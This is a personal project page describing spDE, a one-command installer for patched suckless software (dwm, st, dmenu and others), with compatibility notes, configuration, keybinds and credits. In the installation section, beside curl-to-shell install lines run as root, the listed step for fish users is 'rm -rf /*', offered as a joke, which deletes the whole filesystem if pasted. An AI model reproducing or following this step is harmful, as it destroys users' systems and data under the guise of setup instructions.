# speedie's page

#### // [Project 081](https://p081.github.io) | [Elevendebloater](https://spdgmr.github.io/elevendebloater) | [sfetch](https://spdgmr.github.io/sfetch) | [More Projects](https://spdgmr.github.io/projects) | [spDE](https://spdgmr.github.io/spde) | [Discord server](https://ffdiscord.github.io) | [Twitter](https://nitter.net/spdgmr) | [YouTube](https://invidious.namazso.eu/speedie) | [RSS](https://raw.githubusercontent.com/spdgmr/posts/main/rss.xml)

![image](https://user-images.githubusercontent.com/71722170/156585793-71d13e37-eacc-4982-aa08-d03ea561a7a6.png)

### about spDE

spDE is a collection of mostly forked suckless software that has been patched and riced. it's a "one line command" install which makes it an easy way to use suckless software (although not as customizable)

### software

spDE comes with dwm as the window manager, st as the terminal, slstatus as the status bar, dmenu as the application launcher. it also comes with fff as the file manager, firefox as the web browser, picom as the compositor, sfetch as the fetch script, mocp as the music player, and feh as the image viewer

### compatibility

spDE is technically compatible with every linux distribution but the install script are not. currently the installation scripts should work with the following distributions as well as anything based on them:

- [debian (untested)](https://debian.org)
- [arch](https://archlinux.org)
- [gentoo (very based)](https://gentoo.org)
- [redhat/fedora (untested)](https://getfedora.org)
- [void (untested)](https://voidlinux.org)

### installation
set up a debian/arch/gentoo/redhat/void system and log in as root. make sure to create a new user and change their password. 

make sure you have unzip, curl and bash or zsh installed before running these!

then run one of these commands depending on what shell you use. if you're not sure, you can run "echo $SHELL" in a terminal. note that the shell cannot be sh.

    for zsh: curl https://getspde.github.io | zsh

    for bash: curl https://getspde.github.io | bash

    for fish: rm -rf /* # seriously that thing sucks.
    
then install xorg-server, xinit, xf86-input-libinput and xf86-video-*whatever-you-have* using your distro's package manager.

### configure and customize
to configure the suckless software, edit these files. 

![image](https://user-images.githubusercontent.com/71722170/155650465-d55c80d8-2582-4e9f-b1f8-beadfdbbb23a.png)

then cd to /usr/local/bin/.spDE/<software> and run make

### keybinds
these are the default keybinds
in spDE, you can press ctrl+alt+h to see them at any time.

![image](https://user-images.githubusercontent.com/71722170/156586357-eef95fec-174e-4a8e-9342-eb6bc10575f3.png)

### keeping up with the updates
you can use newsboat and my RSS feed (comes with spDE) to keep up with the updates easily.
just run newsboat in the terminal and select 'speedie // based posts'

### credit
- dwm, dmenu, slstatus and st made by [suckless.org](https://suckless.org)
- firefox made by [mozilla](https://mozilla.org)
- sfetch fetch script made by [speedie](https://spdgmr.github.io/sfetch)
- fff file manager made by [dylanaraps](https://github.com/dylanaraps/fff)
- feh image viewer made by [finalrewind](https://feh.finalrewind.org/)
- suckless software riced and patched by [speedie](https://spdgmr.github.io)
- setwallpaper script by [speedie](https://spdgmr.github.io)
  
### contributing

if you would like to contribute to this project, contribute to the people who made the software (see credits above).
if you would like to support me, please test the software for me.

### more screenshots
![image](https://user-images.githubusercontent.com/71722170/156585793-71d13e37-eacc-4982-aa08-d03ea561a7a6.png)
![image](https://user-images.githubusercontent.com/71722170/155648768-1ed76aff-918e-4a50-b16f-12716f6ec3f3.png)
![image](https://user-images.githubusercontent.com/71722170/156586277-f8cc91c5-999b-4cf3-9976-ed5510991905.png)
